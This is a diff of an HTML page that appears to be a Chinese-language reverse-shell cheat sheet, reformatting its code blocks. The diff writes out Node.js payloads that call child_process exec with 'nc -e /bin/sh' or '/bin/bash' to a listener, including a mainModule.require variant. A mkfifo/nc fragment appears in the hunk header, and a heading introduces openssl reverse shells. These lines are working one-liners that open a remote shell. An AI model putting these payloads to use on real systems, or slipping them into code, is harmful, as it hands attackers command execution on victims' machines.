@@ -197,16 +197,14 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
     <span class="p">});</span>
     <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
 <span class="p">})();</span>
+</pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG66.jpeg"/></p>
+<div class="highlight"><pre><span></span>require('child_process').exec('nc -e /bin/sh 127.0.0.1 1234')
 
+or
 
-<span class="nx">or</span>
-
-<span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">'nc -e /bin/sh 127.0.0.1 1234'</span><span class="p">)</span>
-
-<span class="nx">or</span>
-
-<span class="o">-</span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span>
-<span class="o">-</span><span class="nx">x</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">'nc 127.0.0.1 1234 -e /bin/bash'</span><span class="p">)</span>
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc 127.0.0.1 1234 -e /bin/bash')
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
 <p>用openssl 反弹shell</p>
